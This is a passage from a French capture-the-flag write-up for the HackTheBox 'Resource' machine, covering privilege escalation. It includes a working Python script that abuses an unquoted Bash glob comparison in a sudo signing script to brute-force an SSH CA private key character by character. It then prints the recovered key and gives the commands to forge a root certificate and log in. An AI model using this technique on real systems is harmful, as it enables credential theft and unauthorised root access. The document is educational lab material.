</span></span><span style=display:flex><span><span style=color:#e06c75>ca_file</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$1</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>public_key_file</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$2</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>username</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$3</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>principal_str</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$4</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>serial</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;</span><span style=color:#e06c75>$5</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> ! -f <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$ca_file</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: CA file &#39;</span><span style=color:#e06c75>$ca_file</span><span style=color:#98c379>&#39; not found.&#34;</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>itca</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>cat /etc/ssh/ca-it<span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>ca</span><span style=color:#56b6c2>=</span><span style=color:#c678dd>$(</span>cat <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$ca_file</span><span style=color:#98c379>&#34;</span><span style=color:#c678dd>)</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[[</span> <span style=color:#e06c75>$itca</span> <span style=color:#56b6c2>==</span> <span style=color:#e06c75>$ca</span> <span style=color:#56b6c2>]]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: Use API for signing with this CA.&#34;</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#56b6c2>[</span> ! -f <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$public_key_file</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: Public key file &#39;</span><span style=color:#e06c75>$public_key_file</span><span style=color:#98c379>&#39; not found.&#34;</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>supported_principals</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;webserver,analytics,support,security&#34;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>IFS</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#39;,&#39;</span> <span style=color:#e5c07b>read</span> -ra principal <span style=color:#56b6c2>&lt;&lt;&lt;</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$principal_str</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>for</span> word in <span style=color:#98c379>&#34;</span><span style=color:#98c379>${</span><span style=color:#e06c75>principal</span>[@]<span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>do</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> ! <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$supported_principals</span><span style=color:#98c379>&#34;</span> | grep -qw <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$word</span><span style=color:#98c379>&#34;</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: &#39;</span><span style=color:#e06c75>$word</span><span style=color:#98c379>&#39; is not a supported principal.&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Choose from:&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    webserver - external web servers - webadmin user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    analytics - analytics team databases - analytics user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    support - IT support server - support user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;    security - SOC servers - support user&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>echo</span>
</span></span><span style=display:flex><span>        usage
</span></span><span style=display:flex><span>    <span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> ! <span style=color:#56b6c2>[[</span> <span style=color:#e06c75>$serial</span> <span style=color:#56b6c2>=</span>~ ^<span style=color:#56b6c2>[</span>0-9<span style=color:#56b6c2>]</span>+$ <span style=color:#56b6c2>]]</span>; <span style=color:#c678dd>then</span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>echo</span> <span style=color:#98c379>&#34;Error: &#39;</span><span style=color:#e06c75>$serial</span><span style=color:#98c379>&#39; is not a number.&#34;</span>
</span></span><span style=display:flex><span>    usage
</span></span><span style=display:flex><span><span style=color:#c678dd>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ssh-keygen -s <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$ca_file</span><span style=color:#98c379>&#34;</span> -z <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$serial</span><span style=color:#98c379>&#34;</span> -I <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$username</span><span style=color:#98c379>&#34;</span> -V -1w:forever -n <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$principal</span><span style=color:#98c379>&#34;</span> <span style=color:#98c379>&#34;</span><span style=color:#e06c75>$public_key_file</span><span style=color:#98c379>&#34;</span>
</span></span></code></pre></div><p>Après avoir examiné attentivement le script, nous découvrons une vulnérabilité: le côté droit de l&rsquo;opération de correspondance <code>[[ $itca == $ca ]]</code> n&rsquo;est pas entre guillemets, ce qui le rend vulnérable aux attaques par force brute. Sans ces guillemets, Bash effectue un &ldquo;pattern matching&rdquo; au lieu d&rsquo;interpréter les données comme une chaîne de caractères.</p><p>Par exemple, si nous avons une opération de recherche de mot de passe avec <code>[[$DB_PASS == mystrongpassword]]</code>, la saisie de <code>mys*</code> sera évaluée à <code>vrai</code> parce que c&rsquo;est un pattern global correspondant à n&rsquo;importe quelle chaîne commençant par ces trois lettres. De même, dans le script <code>sign_key.sh</code>, la ligne <code>[[ $itca == $ca ]]</code> compare les deux chaînes sans les guillemets, ce qui nous permet de reconstruire le contenu de la clé du CA (Autorité de Certification) de manière progressive, un caractère à la fois. Nous utilisons le script ci-dessous pour récupérer la clé.</p><blockquote><p>Dans <code>etc/ssh/auth_principals/root</code> nous trouvons que le nom de principal valide pour root est <code>root_user</code>.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>subprocess</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>charset</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=</span><span style=color:#98c379>\n</span><span style=color:#98c379> &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>discovered_ca</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;-----BEGIN OPENSSH PRIVATE KEY-----</span><span style=color:#98c379>\n</span><span style=color:#98c379>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>temp_ca_file</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;temp_ca_guess&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>while</span> <span style=color:#e5c07b>True</span>:
</span></span><span style=display:flex><span>    <span style=color:#e06c75>found_character</span> <span style=color:#56b6c2>=</span> <span style=color:#e5c07b>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>char</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>charset</span>:
</span></span><span style=display:flex><span>        <span style=color:#e06c75>current_guess</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>discovered_ca</span> <span style=color:#56b6c2>+</span> <span style=color:#e06c75>char</span> <span style=color:#56b6c2>+</span> <span style=color:#98c379>&#34;*&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>with</span> <span style=color:#e5c07b>open</span>(<span style=color:#e06c75>temp_ca_file</span>, <span style=color:#98c379>&#34;w&#34;</span>) <span style=color:#c678dd>as</span> <span style=color:#e06c75>f</span>:
</span></span><span style=display:flex><span>            <span style=color:#e06c75>f</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>write</span>(<span style=color:#e06c75>current_guess</span>)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#e06c75>result</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>subprocess</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>run</span>(
</span></span><span style=display:flex><span>            [<span style=color:#98c379>&#34;sudo&#34;</span>, <span style=color:#98c379>&#34;/opt/sign_key.sh&#34;</span>, <span style=color:#e06c75>temp_ca_file</span>, <span style=color:#98c379>&#34;test.pub&#34;</span>, <span style=color:#98c379>&#34;root&#34;</span>, <span style=color:#98c379>&#34;root_user&#34;</span>, <span style=color:#98c379>&#34;1&#34;</span>],
</span></span><span style=display:flex><span>            <span style=color:#e06c75>stdout</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>subprocess</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>PIPE</span>,
</span></span><span style=display:flex><span>            <span style=color:#e06c75>text</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>True</span>
</span></span><span style=display:flex><span>        )
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#98c379>&#34;Use API for signing with this CA&#34;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>result</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>stdout</span>:
</span></span><span style=display:flex><span>            <span style=color:#7f848e># Correct character found, append to discovered_ca</span>
</span></span><span style=display:flex><span>            <span style=color:#e06c75>discovered_ca</span> <span style=color:#56b6c2>+=</span> <span style=color:#e06c75>char</span>
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[+] Discovered so far: </span><span style=color:#98c379>{</span><span style=color:#e06c75>discovered_ca</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#e06c75>found_character</span> <span style=color:#56b6c2>=</span> <span style=color:#e5c07b>True</span>
</span></span><span style=display:flex><span>            <span style=color:#c678dd>break</span>  <span style=color:#7f848e># Break inner loop to continue building the CA string</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#56b6c2>not</span> <span style=color:#e06c75>found_character</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#98c379>&#34;-----END OPENSSH PRIVATE KEY-----&#34;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>discovered_ca</span>:
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[!] Full CA content discovered:</span><span style=color:#98c379>\n</span><span style=color:#98c379>{</span><span style=color:#e06c75>discovered_ca</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[!] Script terminated prematurely. Partial CA content:</span><span style=color:#98c379>\n</span><span style=color:#98c379>{</span><span style=color:#e06c75>discovered_ca</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#c678dd>break</span>
</span></span></code></pre></div><p>Après avoir exécuté le script, nous récupérons la clé et la sauvegardons dans un fichier (que j&rsquo;ai nommé <code>root.key</code> dans mon cas).</p><blockquote><p>Nous devons ajouter manuellement <code>-----END OPENSSH PRIVATE KEY-----</code> à la clé.</p></blockquote><pre tabindex=0><code>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
QBAgM=
-----END OPENSSH PRIVATE KEY-----
</code></pre><p><img src=/images/HTB-Resource/CA_content.png alt="CA content"></p><p>Nous pouvons retourner sur notre machine locale et générer des clés SSH pour root.</p><ol><li>Générer une paire de clés pour root.</li></ol><pre tabindex=0><code>ssh-keygen -f root
</code></pre><ol start=2><li>Modifier l&rsquo;autorisation de la clé récupérée.</li></ol><pre tabindex=0><code>chmod 600 root.key
</code></pre><ol start=3><li>Créez un certificat SSH en signant la clé publique.</li></ol><pre tabindex=0><code>ssh-keygen -s root.key -z 200 -I root -V -52w:forever -n root_user root.pub
</code></pre><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>-s root.key</td><td>Spécifie la clé de signature, qui est la clé privée de l&rsquo;autorité de certification (CA).</td></tr><tr><td>-z 200</td><td>Indique le numéro de série du certificat. Il s&rsquo;agit d&rsquo;un identifiant unique pour le certificat.</td></tr><tr><td>-I root</td><td>Spécifie l&rsquo;identité de la clé. L&rsquo;identité (<code>root</code>) est un label arbitraire pour le certificat.</td></tr><tr><td>-V -52w:forever</td><td>Spécifie la période de validité.</td></tr><tr><td>-n root_user</td><td>Spécifie les principaux autorisés (noms d&rsquo;utilisateur ou rôles).</td></tr><tr><td>root.pub</td><td>Spécifie le fichier de clé publique à signer. Le certificat sera généré pour cette clé, et le fichier résultant sera nommé <code>root-cert.pub</code>.</td></tr></tbody></table><ol start=4><li>Se connecter en tant que root</li></ol><pre tabindex=0><code>ssh root@itrc.ssg.htb -p2222 -i root -i root-cert.pub
</code></pre><blockquote><p>La clé privée (<code>root</code>) fournit une preuve de propriété, tandis que le certificat (<code>root-cert.pub</code>) établit la confiance entre notre clé et le serveur. Le serveur valide le certificat en utilisant la clé publique de l&rsquo;autorité de certification stockée dans sa configuration (dans <code>TrustedUserCAKeys</code>), et utilise ensuite la clé privée pour compléter le processus d&rsquo;authentification. Le certificat indique au serveur de faire confiance à la clé publique <code>root.pub</code> parce qu&rsquo;elle a été signée par l&rsquo;autorité de certification (CA) de confiance. Sans le certificat, le serveur ne reconnaîtrait pas la clé comme une identité de confiance.</p></blockquote><p><img src=/images/HTB-Resource/root_flag.png alt="root ssh login and flag"></p><p>Merci d&rsquo;avoir lu cet article! Si vous avez des questions, vous pouvez me contacter sur <a href=https://x.com/_KScorpio>X</a>.</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-axlle/>&#8592;
Précédent:
HTB: Axlle</a></p><p class=prev-post-date>novembre 15, 2024</p></div><div class=next-post><p><a href=/fr/posts/thm-thestickershop/>Suivant:
THM: The Sticker Shop
&#8594;</a></p><p class=next-post-date>décembre 4, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a><ul><li><a href=#shell-en-tant-que-msainristil-sur-lhôte-itrc>Shell en tant que msainristil (sur l&rsquo;hôte itrc)</a></li><li><a href=#shell-en-tant-que-zzinter-sur-lhôte-itrc>Shell en tant que zzinter (sur l&rsquo;hôte itrc)</a></li><li><a href=#shell-en-tant-que-support-sur-lhôte-ssg>Shell en tant que support (sur l&rsquo;hôte ssg)</a></li><li><a href=#shell-en-tant-que-zzinter-sur-lhôte-ssg>Shell en tant que zzinter (sur l&rsquo;hôte ssg)</a></li></ul></li><li><a href=#elévation-de-privilèges---shell-en-tant-que-root-sur-lhôte-ssg>Elévation de Privilèges - Shell en tant que root (sur l&rsquo;hôte ssg)</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>